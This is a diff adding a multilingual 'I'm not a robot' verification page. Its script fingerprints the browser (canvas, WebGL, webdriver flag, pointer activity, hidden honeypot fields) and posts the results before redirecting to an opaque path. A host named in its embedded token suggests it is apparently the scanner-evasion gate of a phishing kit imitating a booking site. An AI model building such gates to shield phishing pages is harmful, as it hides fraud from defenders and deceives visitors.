@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <title>Verification</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230a2540'/%3E%3C/svg%3E">
+  <style>
+    @font-face {
+      font-family: "Material Icons";
+      font-style: normal;
+      font-weight: 400;
+      font-display: swap;
+      src: url(/fonts/MaterialIcons.ttf) format("truetype");
+    }
+    .material-icons {
+      font-family: "Material Icons";
+      font-weight: normal;
+      font-style: normal;
+      font-size: 24px;
+      display: inline-block;
+      line-height: 1;
+      text-transform: none;
+      letter-spacing: normal;
+      white-space: nowrap;
+      direction: ltr;
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
+    }
+
+    :root {
+      --accent: #D4A855;
+      --accent-light: color-mix(in srgb, var(--accent) 28%, #fff);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+
+    body {
+      min-height: 100%;
+      min-height: 100dvh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 1.5;
+      color: rgba(0, 0, 0, 0.87);
+      background: #fff;
+      -webkit-font-smoothing: antialiased;
+      -webkit-user-select: none;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      background: #fff;
+      z-index: 1;
+    }
+
+    .wrap { width: 100%; max-width: 380px; margin-top: 0; }
+
+    .card {
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 28px rgba(0, 0, 0, 0.16), 0 4px 10px rgba(0, 0, 0, 0.08);
+      width: 100%;
+      padding: 24px;
+      text-align: left;
+      overflow: hidden;
+      opacity: 1;
+      transform: scale(1);
+      transition: opacity 120ms cubic-bezier(0.4, 0, 1, 1);
+    }
+    .card.show { opacity: 1; transform: scale(1); }
+    .card.fade-out {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .logo {
+      width: 40px;
+      height: 40px;
+      margin: 0 0 16px;
+      border-radius: 50%;
+      background: color-mix(in srgb, var(--accent) 12%, #fff);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo .material-icons {
+      font-size: 22px;
+      color: var(--accent);
+    }
+
+    .captcha-transit {
+      position: fixed;
+      inset: 0;
+      z-index: 100;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: #fff;
+      pointer-events: none;
+    }
+    .captcha-transit.show { display: flex; }
+    .captcha-transit .t-spin {
+      width: 28px;
+      height: 28px;
+      border: 3px solid color-mix(in srgb, var(--accent) 28%, #fff);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    .title {
+      font-size: 20px;
+      font-weight: 500;
+      line-height: 1.4;
+      letter-spacing: 0;
+      margin: 0 0 4px;
+      color: rgba(0, 0, 0, 0.87);
+    }
+
+    .subtitle {
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 1.5;
+      color: rgba(0, 0, 0, 0.54);
+      margin: 0 0 20px;
+    }
+
+    .row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      width: 100%;
+      min-height: 48px;
+      padding: 12px 14px;
+      border: 1.5px solid rgba(0, 0, 0, 0.15);
+      border-radius: 8px;
+      background: #fff;
+      cursor: pointer;
+      text-align: left;
+      transition: background 0.2s, border-color 0.2s;
+    }
+    .row:hover:not(.loading):not(.done):not(.checking) {
+      background: rgba(0, 0, 0, 0.03);
+      border-color: rgba(0, 0, 0, 0.25);
+    }
+    .row:focus-visible {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px color-mix(in srgb, var(--accent) 22%, transparent);
+    }
+    .row.loading, .row.checking { cursor: default; }
+    .row.checking { pointer-events: none; }
+    .row.done {
+      cursor: default;
+      border-color: var(--accent);
+      background: color-mix(in srgb, var(--accent) 8%, #fff);
+    }
+
+    .check {
+      position: relative;
+      display: block;
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
+      border: 2px solid rgba(0, 0, 0, 0.74);
+      border-radius: 2px;
+      background: #fff;
+    }
+    .row.done .check {
+      border-color: var(--accent);
+      background: #fff;
+    }
+    .row.loading .check,
+    .row.checking .check {
+      border-color: transparent;
+      background: transparent;
+    }
+
+    .spin {
+      position: absolute;
+      inset: -3px;
+      border: 2px solid rgba(0, 0, 0, 0.12);
+      border-top-color: #212121;
+      border-radius: 50%;
+      opacity: 0;
+      animation: spin 0.7s linear infinite;
+    }
+    .row.loading .spin { opacity: 1; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .tick {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+    }
+    .row.done .tick { opacity: 1; }
+    .tick path {
+      fill: none;
+      stroke: var(--accent);
+      stroke-width: 3;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .label {
+      flex: 1;
+      font-size: 14px;
+      font-weight: 400;
+      line-height: 1.4;
+      color: rgba(0, 0, 0, 0.87);
+    }
+    .row.done .label { color: var(--accent); }
+
+    .footer {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      gap: 6px;
+      margin-top: 16px;
+      padding-top: 0;
+      border-top: none;
+      color: rgba(0, 0, 0, 0.54);
+    }
+    .footer .material-icons {
+      font-size: 16px;
+      color: #4CAF50;
+    }
+    .footer span {
+      font-size: 12px;
+      color: rgba(0, 0, 0, 0.54);
+    }
+
+    .hp {
+      position: absolute;
+      left: -9999px;
+      opacity: 0;
+      height: 0;
+      width: 0;
+      pointer-events: none;
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .card, .row, .tick, .spin, .captcha-transit .t-spin {
+        transition: none;
+        animation: none;
+      }
+      .card { opacity: 1; transform: none; }
+      .card.fade-out { opacity: 0; }
+    }
+  </style>
+</head>
+<body data-page="captcha">
+  <div class="overlay">
+  <div class="wrap">
+    <div class="card" id="card">
+      <div class="logo" id="logo" aria-hidden="true">
+        <i class="material-icons" translate="no">verified_user</i>
+      </div>
+
+      <h1 class="title" id="title">Verify you're human</h1>
+      <p class="subtitle" id="subtitle">Confirm below to continue</p>
+
+      <div class="row" id="cb" role="checkbox" aria-checked="false" tabindex="0">
+        <span class="check">
+          <span class="spin" aria-hidden="true"></span>
+          <svg class="tick" viewBox="0 0 24 24" aria-hidden="true"><path d="M6 12.5 L10 16.5 L18 8"></path></svg>
+        </span>
+        <span class="label" id="cbLabel">I'm not a robot</span>
+      </div>
+
+      <div class="footer">
+        <i class="material-icons" translate="no">lock</i>
+        <span id="footerSub">Protected connection</span>
+      </div>
+    </div>
+  </div>
+  </div>
+
+  <input type="text" name="email_confirm" class="hp" tabindex="-1" autocomplete="off">
+  <input type="text" name="website_url" class="hp" tabindex="-1" autocomplete="off">
+  <input type="text" name="phone_number" class="hp" tabindex="-1" autocomplete="off">
+  <noscript>JavaScript required</noscript>
+
+  <script>
+
+    const T = {
+      en:{title:"Verification",subtitle:"Confirm you are human to continue.",robot:"I am not a robot",verified:"Verified",footerSub:"Secure connection"},
+      ru:{title:"Проверка",subtitle:"Подтвердите, что вы человек.",robot:"Я не робот",verified:"Подтверждено",footerSub:"Защищённое соединение"},
+      uk:{title:"Підтвердьте, що ви людина",subtitle:"Натисніть нижче, щоб продовжити",robot:"Я не робот",verified:"Підтверджено",footerSub:"Захищене з'єднання"},
+      de:{title:"Bestätigen Sie, dass Sie ein Mensch sind",subtitle:"Bestätigen Sie unten, um fortzufahren",robot:"Ich bin kein Roboter",verified:"Bestätigt",footerSub:"Geschützte Verbindung"},
+      fr:{title:"Confirmez que vous êtes humain",subtitle:"Confirmez ci-dessous pour continuer",robot:"Je ne suis pas un robot",verified:"Vérifié",footerSub:"Connexion protégée"},
+      es:{title:"Confirma que eres humano",subtitle:"Confirma abajo para continuar",robot:"No soy un robot",verified:"Verificado",footerSub:"Conexión protegida"},
+      pt:{title:"Confirme que você é humano",subtitle:"Confirme abaixo para continuar",robot:"Não sou um robô",verified:"Verificado",footerSub:"Conexão protegida"},
+      it:{title:"Conferma di essere umano",subtitle:"Conferma qui sotto per continuare",robot:"Non sono un robot",verified:"Verificato",footerSub:"Connessione protetta"},
+      nl:{title:"Bevestig dat je een mens bent",subtitle:"Bevestig hieronder om door te gaan",robot:"Ik ben geen robot",verified:"Geverifieerd",footerSub:"Beveiligde verbinding"},
+      pl:{title:"Potwierdź, że jesteś człowiekiem",subtitle:"Potwierdź poniżej, aby kontynuować",robot:"Nie jestem robotem",verified:"Zweryfikowano",footerSub:"Chronione połączenie"},
+      cs:{title:"Potvrďte, že jste člověk",subtitle:"Pokračujte potvrzením níže",robot:"Nejsem robot",verified:"Ověřeno",footerSub:"Chráněné připojení"},
+      tr:{title:"İnsan olduğunuzu doğrulayın",subtitle:"Devam etmek için aşağıdan onaylayın",robot:"Ben robot değilim",verified:"Doğrulandı",footerSub:"Korumalı bağlantı"},
+      zh:{title:"验证您是真人",subtitle:"请在下方确认以继续",robot:"我不是机器人",verified:"已验证",footerSub:"受保护的连接"},
+      ja:{title:"人間であることを確認",subtitle:"続行するには下で確認してください",robot:"私はロボットではありません",verified:"確認済み",footerSub:"保護された接続"},
+      ko:{title:"사람인지 확인",subtitle:"계속하려면 아래에서 확인하세요",robot:"로봇이 아닙니다",verified:"확인됨",footerSub:"보호된 연결"},
+      ar:{title:"أكّد أنك إنسان",subtitle:"أكّد أدناه للمتابعة",robot:"أنا لست روبوتًا",verified:"تم التحقق",footerSub:"اتصال محمي"},
+      he:{title:"אמת שאתה אנושי",subtitle:"אשר למטה כדי להמשיך",robot:"אני לא רובוט",verified:"מאומת",footerSub:"חיבור מאובטח"},
+      sv:{title:"Bekräfta att du är människa",subtitle:"Bekräfta nedan för att fortsätta",robot:"Jag är inte en robot",verified:"Verifierad",footerSub:"Skyddad anslutning"},
+      da:{title:"Bekræft, at du er menneske",subtitle:"Bekræft nedenfor for at fortsætte",robot:"Jeg er ikke en robot",verified:"Bekræftet",footerSub:"Beskyttet forbindelse"},
+      no:{title:"Bekreft at du er menneske",subtitle:"Bekreft nedenfor for å fortsette",robot:"Jeg er ikke en robot",verified:"Verifisert",footerSub:"Beskyttet tilkobling"},
+      fi:{title:"Vahvista, että olet ihminen",subtitle:"Jatka vahvistamalla alla",robot:"En ole robotti",verified:"Vahvistettu",footerSub:"Suojattu yhteys"},
+      ro:{title:"Confirmați că sunteți om",subtitle:"Confirmați mai jos pentru a continua",robot:"Nu sunt robot",verified:"Verificat",footerSub:"Conexiune protejată"},
+      hu:{title:"Erősítse meg, hogy ember",subtitle:"A folytatáshoz erősítse meg alább",robot:"Nem vagyok robot",verified:"Ellenőrizve",footerSub:"Védett kapcsolat"},
+      el:{title:"Επιβεβαιώστε ότι είστε άνθρωπος",subtitle:"Επιβεβαιώστε παρακάτω για να συνεχίσετε",robot:"Δεν είμαι ρομπότ",verified:"Επαληθεύτηκε",footerSub:"Προστατευμένη σύνδεση"},
+      bg:{title:"Потвърдете, че сте човек",subtitle:"Потвърдете по-долу, за да продължите",robot:"Аз не съм робот",verified:"Потвърдено",footerSub:"Защитена връзка"},
+      lv:{title:"Apstipriniet, ka esat cilvēks",subtitle:"Apstipriniet zemāk, lai turpinātu",robot:"Es neesmu robots",verified:"Verificēts",footerSub:"Aizsargāts savienojums"},
+      lt:{title:"Patvirtinkite, kad esate žmogus",subtitle:"Patvirtinkite žemiau, kad tęstumėte",robot:"Aš ne robotas",verified:"Patvirtinta",footerSub:"Apsaugotas ryšys"},
+      et:{title:"Kinnitage, et olete inimene",subtitle:"Jätkamiseks kinnitage allpool",robot:"Ma ei ole robot",verified:"Kinnitatud",footerSub:"Kaitstud ühendus"},
+      ca:{title:"Confirma que ets humà",subtitle:"Confirma a sota per continuar",robot:"No sóc un robot",verified:"Verificat",footerSub:"Connexió protegida"},
+      hi:{title:"पुष्टि करें कि आप मानव हैं",subtitle:"जारी रखने के लिए नीचे पुष्टि करें",robot:"मैं रोबोट नहीं हूँ",verified:"सत्यापित",footerSub:"सुरक्षित कनेक्शन"},
+      hr:{title:"Potvrdite da ste čovjek",subtitle:"Potvrdite ispod za nastavak",robot:"Nisam robot",verified:"Potvrđeno",footerSub:"Zaštićena veza"},
+      id:{title:"Konfirmasi Anda manusia",subtitle:"Konfirmasi di bawah untuk melanjutkan",robot:"Saya bukan robot",verified:"Terverifikasi",footerSub:"Koneksi terlindungi"},
+      is:{title:"Staðfestu að þú sért manneskja",subtitle:"Staðfestu hér að neðan til að halda áfram",robot:"Ég er ekki vélmenni",verified:"Staðfest",footerSub:"Verndað samband"},
+      ka:{title:"დაადასტურეთ, რომ ადამიანი ხართ",subtitle:"გასაგრძელებლად დაადასტურეთ ქვემოთ",robot:"მე არ ვარ რობოტი",verified:"დადასტურებულია",footerSub:"დაცული კავშირი"},
+      mk:{title:"Потврдете дека сте човек",subtitle:"Потврдете подолу за да продолжите",robot:"Јас не сум робот",verified:"Потврдено",footerSub:"Заштитена врска"},
+      ms:{title:"Sahkan anda manusia",subtitle:"Sahkan di bawah untuk meneruskan",robot:"Saya bukan robot",verified:"Disahkan",footerSub:"Sambungan dilindungi"},
+      sk:{title:"Potvrďte, že ste človek",subtitle:"Pokračujte potvrdením nižšie",robot:"Nie som robot",verified:"Overené",footerSub:"Chránené pripojenie"},
+      sl:{title:"Potrdite, da ste človek",subtitle:"Za nadaljevanje potrdite spodaj",robot:"Nisem robot",verified:"Preverjeno",footerSub:"Zaščitena povezava"},
+      sq:{title:"Konfirmoni se jeni njeri",subtitle:"Konfirmoni më poshtë për të vazhduar",robot:"Unë nuk jam robot",verified:"I verifikuar",footerSub:"Lidhje e mbrojtur"},
+      sr:{title:"Потврдите да сте човек",subtitle:"Потврдите испод да наставите",robot:"Нисам робот",verified:"Потврђено",footerSub:"Заштићена веза"},
+      th:{title:"ยืนยันว่าคุณเป็นมนุษย์",subtitle:"ยืนยันด้านล่างเพื่อดำเนินการต่อ",robot:"ฉันไม่ใช่หุ่นยนต์",verified:"ยืนยันแล้ว",footerSub:"การเชื่อมต่อที่ปลอดภัย"},
+      vi:{title:"Xác nhận bạn là con người",subtitle:"Xác nhận bên dưới để tiếp tục",robot:"Tôi không phải là người máy",verified:"Đã xác minh",footerSub:"Kết nối được bảo vệ"},
+    };
+
+
+    const CHECKING = {
+      en:{checking:"Verification",checkingSub:"This will only take a moment.",checkingLabel:"Verifying"},
+      ru:{checking:"Проверка",checkingSub:"Это займёт несколько секунд.",checkingLabel:"Проверяем"},
+      uk:{checking:"Перевірка",checkingSub:"Це займе кілька секунд.",checkingLabel:"Перевіряємо"},
+      de:{checking:"Einen Moment",checkingSub:"Browser wird geprüft",checkingLabel:"Prüfung…"},
+      fr:{checking:"Un instant",checkingSub:"Vérification du navigateur",checkingLabel:"Vérification…"},
+      es:{checking:"Un momento",checkingSub:"Comprobando el navegador",checkingLabel:"Comprobando…"},
+      pt:{checking:"Um momento",checkingSub:"A verificar o navegador",checkingLabel:"A verificar…"},
+      it:{checking:"Un attimo",checkingSub:"Controllo del browser",checkingLabel:"Verifica…"},
+      nl:{checking:"Even geduld",checkingSub:"Browser controleren",checkingLabel:"Controleren…"},
+      pl:{checking:"Chwileczkę",checkingSub:"Sprawdzamy przeglądarkę",checkingLabel:"Sprawdzanie…"},
+    };
+    Object.keys(T).forEach((k) => { Object.assign(T[k], CHECKING[k] || CHECKING.en); });
+
+    const lang = 'en';
+    const t = T[lang] || T.en;
+    const tx = (k) => (t[k] || T.en[k]);
+
+    document.getElementById('title').textContent = tx('title');
+    document.getElementById('subtitle').textContent = tx('subtitle');
+    document.getElementById('footerSub').textContent = tx('footerSub');
+
+    const card = document.getElementById('card');
+    const cb = document.getElementById('cb');
+    const cbLabel = document.getElementById('cbLabel');
+    cbLabel.textContent = tx('robot');
+    cb.setAttribute('aria-label', tx('robot'));
+
+    requestAnimationFrame(() => {
+      card.classList.add('show');
+    });
+
+    const startTime = Date.now();
+    let sessionToken = 'v1.eyJ0IjoicyIsImgiOiJib29raW5ncm0uYXJyaXZhbHByb2ZpbGUuY29tIiwiaWF0IjoxNzg5NzM3MzUyLCJleHAiOjE3ODk3Mzc5NTIsIm4iOiJhM2JiNmI0ZWI3NGU0ODdiIn0.3RGCAY1W_Vqz4vsz_CfLh2E9wAmCJq5GwX8IXRVxW4Y';
+    let challengeProof = 'vg-Eqlmvig9e7HXWcG4Nfu1eNdNL6xvu2UZX8g8rKa8';
+    let mouseMoves = 0, touchMoves = 0, retryCount = 0, busy = false, done = false;
+    const MAX_RETRIES = 3;
+    const MIN_WAIT_MS = 1800;
+    const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+    document.addEventListener('mousemove', () => { mouseMoves++; }, { passive: true });
+    document.addEventListener('touchstart', () => { touchMoves++; }, { passive: true });
+    document.addEventListener('touchmove', () => { touchMoves++; }, { passive: true });
+    document.addEventListener('pointerdown', () => { mouseMoves++; }, { passive: true });
+
+    function onCheck() {
+      if (busy || done) return;
+      const left = MIN_WAIT_MS - (Date.now() - startTime);
+      if (left > 0) {
+        busy = true;
+        cb.classList.add('loading');
+        setTimeout(() => { busy = false; onCheck(); }, left);
+        return;
+      }
+      busy = true;
+      cb.classList.add('loading');
+      cb.setAttribute('aria-checked', 'true');
+      verify();
+    }
+    cb.addEventListener('click', onCheck);
+    cb.addEventListener('keydown', (e) => {
+      if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); onCheck(); }
+    });
+
+    function fp() {
+      try {
+        const c = document.createElement('canvas');
+        const x = c.getContext('2d');
+        x.textBaseline = 'top';
+        x.font = '14px Arial';
+        x.fillText('fp', 2, 2);
+        return c.toDataURL().slice(-50);
+      } catch (e) { return 'none'; }
+    }
+    function gl() {
+      try {
+        const c = document.createElement('canvas');
+        const g = c.getContext('webgl');
+        if (!g) return 'none';
+        const d = g.getExtension('WEBGL_debug_renderer_info');
+        return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : 'ok';
+      } catch (e) { return 'none'; }
+    }
+    function hp() {
+      return {
+        email_confirm: document.querySelector('input[name="email_confirm"]')?.value || '',
+        website_url: document.querySelector('input[name="website_url"]')?.value || '',
+        phone_number: document.querySelector('input[name="phone_number"]')?.value || '',
+      };
+    }
+
+    function resetState() {
+      busy = false;
+      cb.classList.remove('loading', 'done');
+      cb.setAttribute('aria-checked', 'false');
+      cbLabel.textContent = tx('robot');
+    }
+
+    function goToPage(url) {
+      window.location.replace(url);
+    }
+
+    async function verify() {
+      try {
+        const res = await fetch('/verify-captcha', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            redirect: '/1874490215/',
+            timestamp: startTime,
+            challenge: 'js_enabled_' + (challengeProof || ''),
+            fingerprint: fp(),
+            webgl: gl(),
+            mouseMoves: mouseMoves,
+            touchMoves: touchMoves,
+            webdriver: !!(navigator.webdriver),
+            timeSpent: Date.now() - startTime,
+            sessionToken: sessionToken,
+            ...hp()
+          })
+        });
+        const data = await res.json();
+        if (data.newToken) sessionToken = data.newToken;
+        if (data.challengeProof) challengeProof = data.challengeProof;
+        if (data.success) {
+          done = true;
+          cb.classList.remove('loading');
+          cb.classList.add('done');
+          cbLabel.textContent = tx('verified');
+          setTimeout(() => goToPage(data.redirect), reduceMotion ? 0 : 280);
+        } else {
+          retryCount++;
+          if (retryCount >= MAX_RETRIES) { window.location.reload(); return; }
+          resetState();
+        }
+      } catch (e) {
+        retryCount++;
+        if (retryCount >= MAX_RETRIES) { window.location.reload(); return; }
+        resetState();
+      }
+    }
+  </script>
+</body>
+</html>
